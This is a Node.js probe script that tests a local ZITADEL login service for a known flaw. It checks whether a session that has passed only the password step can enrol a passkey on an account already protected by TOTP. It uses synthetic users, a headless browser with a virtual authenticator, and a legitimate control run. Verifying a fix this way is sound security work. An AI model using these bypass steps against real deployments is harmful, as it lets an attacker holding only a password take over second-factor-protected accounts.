// The probe of ginsys/bronzeward#1274: can a session that has passed only the first factor add an
// authenticator to an account whose second factor is already enrolled? Upstream advisory
// GHSA-qqv8-37gw-ww2q (Login V2, fixed in ZITADEL 4.20.5). Synthetic accounts and values only.
//
// Usage (from the repository root; web/ supplies webdriverio):
//   node docs/design/research/evidence/20261128-zitadel-pin/mfa-enrol-probe.mjs <state-dir> <fixed|vulnerable>
// <state-dir> is the provider's (.dev/idp, started with `fixtures/dev-idp up --participants`).
// Two new humans each get a TOTP second factor through the management API. In headless Chrome with
// a virtual passkey authenticator:
//   attacker: password only, then the passkey setup page opened by its address (the advisory's
//             example). Fixed: the page refuses. Vulnerable: it offers the passkey and a passkey
//             is added with no second factor.
//   legit:    password, then the TOTP code, then the same page: the passkey is added.
// It prints verdicts and page paths only, never a password, a code, a token or page text, and its
// Chrome profile is removed. Exit 1 when the result differs from the expectation named.
import { mkdirSync, readFileSync, rmSync } from "node:fs";
import { createRequire } from "node:module";
import { createHmac, randomBytes } from "node:crypto";
import { join } from "node:path";
import { fileURLToPath } from "node:url";

const [state, expect] = process.argv.slice(2);
if (!state || !["fixed", "vulnerable"].includes(expect)) throw new Error("usage: mfa-enrol-probe.mjs <state-dir> <fixed|vulnerable>");
const repo = fileURLToPath(new URL("../../../../../", import.meta.url));
const require = createRequire(join(repo, "web/package.json"));
for (const k of Object.keys(process.env)) if (k.startsWith("WDIO_")) delete process.env[k];
const { remote } = require("webdriverio");

const env = Object.fromEntries(readFileSync(join(state, "idp.env"), "utf8").split("\n").filter((l) => l.includes("=")).map((l) => [l.split("=")[0], l.slice(l.indexOf("=") + 1)]));
const issuer = env.BW_TEST_IDP_ISSUER;
const login = `http://localhost:${Number(new URL(issuer).port) + 1}/ui/v2/login`;
const seed = readFileSync(join(state, "seed.pat"), "utf8").trim();
const secrets = [seed];
const out = (line) => console.log(secrets.reduce((s, v) => s.replaceAll(v, "[secret]"), String(line)));

async function api(method, path, body) {
  const res = await fetch(issuer + path, { method, headers: { Authorization: `Bearer ${seed}`, "Content-Type": "application/json" }, body: body && JSON.stringify(body) });
  if (!res.ok) throw new Error(`${method} ${path}: HTTP ${res.status}`);
  return res.json();
}

const b32 = (s) => { let bits = ""; for (const c of s.replace(/=+$/, "")) bits += "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567".indexOf(c).toString(2).padStart(5, "0"); return Buffer.from(bits.match(/.{8}/g).map((b) => parseInt(b, 2))); };
// Every code made here is added to the values `out` hides, before it is sent anywhere, so that an
// error message that names a command's arguments cannot print it.
function totp(secret) {
  const t = Buffer.alloc(8); t.writeBigUInt64BE(BigInt(Math.floor(Date.now() / 30000)));
  const h = createHmac("sha1", b32(secret)).update(t).digest(), o = h[19] & 15;
  const code = String(((h.readUInt32BE(o) & 0x7fffffff) % 1000000)).padStart(6, "0");
  secrets.push(code);
  return code;
}

// A human with a password and an enrolled TOTP: its login name, password, TOTP secret and id.
async function human(name) {
  const password = `BWSYNTH-pw-${randomBytes(4).toString("hex")}-${Math.floor(1000 + Math.random() * 9000)}`;
  secrets.push(password);
  const { userId } = await api("POST", "/v2/users/human", { username: name, profile: { givenName: name, familyName: "synthetic" }, email: { email: `${name}@example.invalid`, isVerified: true }, password: { password, changeRequired: false } });
  const { secret } = await api("POST", `/v2/users/${userId}/totp`, {});
  secrets.push(secret);
  await api("POST", `/v2/users/${userId}/totp/verify`, { code: totp(secret) });
  return { name, password, secret, userId };
}
const methods = async (u) => (await api("GET", `/v2/users/${u.userId}/authentication_methods`)).authMethodTypes ?? [];

const profile = join(state, "probe-profile");
async function session() {
  rmSync(profile, { recursive: true, force: true });
  mkdirSync(profile, { recursive: true });
  const browser = await remote({ logLevel: "silent", capabilities: { browserName: "chrome", "goog:chromeOptions": { args: ["--headless=new", `--user-data-dir=${profile}`] } } });
  // WebdriverIO has no command for the W3C virtual authenticator extension that ChromeDriver
  // serves, so the request goes to the driver directly. The browser is already running: when the
  // request fails, it is closed here, because the caller never receives it.
  try {
    const { hostname, port, path } = browser.options;
    const res = await fetch(`http://${hostname}:${port}${path === "/" ? "" : path}/session/${browser.sessionId}/webauthn/authenticator`, {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ protocol: "ctap2", transport: "internal", hasResidentKey: true, hasUserVerification: true, isUserVerified: true }),
    });
    if (!res.ok) throw new Error(`virtual authenticator: HTTP ${res.status}`);
  } catch (e) {
    await browser.deleteSession();
    throw e;
  }
  return browser;
}
async function fill(browser, selector, value) {
  const f = await browser.$(selector);
  await f.waitForDisplayed({ timeout: 15000 });
  await f.setValue(value);
  await (await browser.$('button[type="submit"]')).click();
}
async function password(browser, u) {
  await browser.url(`${login}/loginname`);
  await fill(browser, 'input[name="loginName"], input#loginName, input[autocomplete="username"]', u.name);
  await fill(browser, 'input[type="password"]', u.password);
  await browser.pause(2500);
  const at = new URL(await browser.getUrl()).pathname;
  out(`  after the password: ${at}`);
  return at;
}
// setupPage: the passkey setup page by its address; offered when its form has a submit button, and
// refused when it shows the second-factor notice. Then the form is submitted when offered.
async function setupPage(browser, u) {
  await browser.url(`${login}/passkey/set?loginName=${u.name}`);
  await browser.pause(2500);
  const body = await (await browser.$("body")).getText();
  const refused = /second factor first/i.test(body);
  const submit = await browser.$('button[type="submit"]');
  const offered = !refused && (await submit.isExisting());
  out(`  passkey setup page ${new URL(await browser.getUrl()).pathname}: ${refused ? "refused (second factor required)" : offered ? "offers the passkey" : "neither"}`);
  if (offered) { await submit.click(); await browser.pause(4000); }
  return { refused, offered };
}
const added = async (u) => (await methods(u)).includes("AUTHENTICATION_METHOD_TYPE_PASSKEY");

let attacker = "unknown", legit = "unknown", failed = false;
try {
  const a = await human(`h-mfa-a-${randomBytes(2).toString("hex")}`);
  const l = await human(`h-mfa-l-${randomBytes(2).toString("hex")}`);
  out(`humans created, each with TOTP enrolled: ${(await methods(a)).includes("AUTHENTICATION_METHOD_TYPE_TOTP") && (await methods(l)).includes("AUTHENTICATION_METHOD_TYPE_TOTP")}`);

  out("attacker: first factor only");
  let browser = await session();
  try {
    // The first factor must have passed: the page the password leads to is the second-factor challenge.
    const at = await password(browser, a);
    const page = await setupPage(browser, a);
    const has = await added(a);
    attacker = !at.endsWith("/otp/time-based") ? "inconclusive: the password did not lead to the second-factor challenge"
      : page.refused && !has ? "refused, no passkey added"
      : page.offered && has ? "passkey added without the second factor"
      : `inconclusive: refused=${page.refused} offered=${page.offered} passkey=${has}`;
  } finally { await browser.deleteSession(); }
  out(`  result: ${attacker}`);

  out("legit: first factor, then TOTP");
  browser = await session();
  try {
    const first = await password(browser, l);
    await fill(browser, 'input[name="code"], input[autocomplete="one-time-code"]', totp(l.secret));
    await browser.pause(2500);
    const at = new URL(await browser.getUrl()).pathname;
    out(`  after the TOTP code: ${at}`);
    const page = await setupPage(browser, l);
    const has = await added(l);
    legit = !first.endsWith("/otp/time-based") || !at.endsWith("/signedin") ? "inconclusive: the second factor was not completed"
      : page.offered && has ? "passkey added after the second factor"
      : `inconclusive: refused=${page.refused} offered=${page.offered} passkey=${has}`;
  } finally { await browser.deleteSession(); }
  out(`  result: ${legit}`);
} catch (e) {
  failed = true;
  out(`failed: ${e.message}`);
} finally {
  rmSync(profile, { recursive: true, force: true });
}
// Anything but the two named outcomes is inconclusive and fails, whatever the expectation, and so
// does any error caught on the way, including one from closing a browser after both outcomes were read.
const ok = !failed && legit === "passkey added after the second factor" &&
  attacker === (expect === "fixed" ? "refused, no passkey added" : "passkey added without the second factor");
out(`RESULT expect=${expect} attacker=[${attacker}] legit=[${legit}] ${ok ? "AS EXPECTED" : "NOT AS EXPECTED"}`);
process.exit(ok ? 0 : 1);
